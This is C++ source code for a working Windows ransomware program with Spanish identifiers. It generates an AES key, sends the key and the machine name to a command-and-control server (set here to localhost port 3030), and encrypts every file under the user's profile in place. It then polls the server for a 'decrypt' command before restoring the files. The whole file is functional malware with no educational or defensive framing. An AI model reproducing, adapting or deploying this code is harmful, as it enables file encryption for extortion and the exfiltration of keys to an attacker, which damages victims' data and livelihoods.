#include <fstream>
#include <vector>
#include <filesystem>
#include <string>
#include <windows.h> 
#include <bcrypt.h> 
#include <wininet.h>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "wininet.lib")

using namespace std;
namespace fs = filesystem;

string to_hex(const BYTE* data, size_t len) {
    stringstream ss;
    for(size_t i = 0; i < len; ++i) ss << hex << setw(2) << setfill('0') << (int)data[i];
    return ss.str();
}

void enviarAlC2(string victimID, string keyHex) {
    HINTERNET hS = InternetOpenA("Explorer", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hS) {
        HINTERNET hC = InternetConnectA(hS, "127.0.0.1", 3030, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hC) {
            HINTERNET hR = HttpOpenRequestA(hC, "POST", "/api/checkin", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
            string data = "id=" + victimID + "&key=" + keyHex;
            HttpSendRequestA(hR, "Content-Type: application/x-www-form-urlencoded", -1, (LPVOID)data.c_str(), (DWORD)data.length());
            InternetCloseHandle(hR);
        }
        InternetCloseHandle(hC);
    }
    InternetCloseHandle(hS);
}

string leerInstruccion(string vID) {
    string res = "locked";
    HINTERNET hS = InternetOpenA("Explorer", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hS) {
        HINTERNET hC = InternetConnectA(hS, "127.0.0.1", 3030, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hC) {
            string path = "/api/instruction/" + vID;
            HINTERNET hR = HttpOpenRequestA(hC, "GET", path.c_str(), NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
            if (HttpSendRequestA(hR, NULL, 0, NULL, 0)) {
                char buf[128]; DWORD read;
                if (InternetReadFile(hR, buf, sizeof(buf)-1, &read) && read > 0) {
                    buf[read] = '\0'; res = string(buf);
                }
            }
            InternetCloseHandle(hR);
        }
        InternetCloseHandle(hC);
    }
    InternetCloseHandle(hS);
    return res;
}

void procesarArchivos(string ruta, BCRYPT_KEY_HANDLE hKey, bool cifrar) {
    for (const auto& entrada : fs::recursive_directory_iterator(ruta, fs::directory_options::skip_permission_denied)) {
        try {
            string p = entrada.path().string();
            if (p.find("\\Windows\\") != string::npos || p.find("\\AppData\\") != string::npos) continue;
            if (fs::is_regular_file(entrada) && entrada.path().extension() != ".exe") {
                
                ifstream fIn(entrada.path(), ios::binary);
                if (!fIn.is_open()) continue;

                
                vector<BYTE> buffer((istreambuf_iterator<char>(fIn)), (istreambuf_iterator<char>()));
                fIn.close();

                BYTE iv[16] = {0}; 
                DWORD outSz = 0;
                vector<BYTE> outBuf;

                if (cifrar) {
                    BCryptEncrypt(hKey, buffer.data(), (DWORD)buffer.size(), NULL, iv, 16, NULL, 0, &outSz, BCRYPT_BLOCK_PADDING);
                    outBuf.resize(outSz);
                    BCryptEncrypt(hKey, buffer.data(), (DWORD)buffer.size(), NULL, iv, 16, outBuf.data(), outSz, &outSz, BCRYPT_BLOCK_PADDING);
                } else {
                    BCryptDecrypt(hKey, buffer.data(), (DWORD)buffer.size(), NULL, iv, 16, NULL, 0, &outSz, BCRYPT_BLOCK_PADDING);
                    outBuf.resize(outSz);
                    BCryptDecrypt(hKey, buffer.data(), (DWORD)buffer.size(), NULL, iv, 16, outBuf.data(), outSz, &outSz, BCRYPT_BLOCK_PADDING);
                }

                ofstream fOut(entrada.path(), ios::binary | ios::trunc);
                fOut.write((char*)outBuf.data(), outBuf.size());
                fOut.close();
                printf(cifrar ? "[+] Locked: %s\n" : "[!] Unlocked: %s\n", entrada.path().filename().string().c_str());
            }
        } catch (...) {}
    }
}

int main() {
    char* user = getenv("USERPROFILE");
    if (!user) return 1;
    string rutaBase = string(user);
    string vID = getenv("COMPUTERNAME") ? getenv("COMPUTERNAME") : "Unknown";

    BCRYPT_ALG_HANDLE hRng = NULL, hAes = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BYTE mKey[32];

    BCryptOpenAlgorithmProvider(&hRng, BCRYPT_RNG_ALGORITHM, NULL, 0);
    BCryptGenRandom(hRng, mKey, 32, 0);
    BCryptOpenAlgorithmProvider(&hAes, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAes, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(hAes, &hKey, NULL, 0, mKey, 32, 0);

    enviarAlC2(vID, to_hex(mKey, 32));
    procesarArchivos(rutaBase, hKey, true);

    while (true) {
        if (leerInstruccion(vID) == "decrypt") {
            procesarArchivos(rutaBase, hKey, false);
            break;
        }
        Sleep(20000); 
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAes, 0);
    BCryptCloseAlgorithmProvider(hRng, 0);
    return 0;
}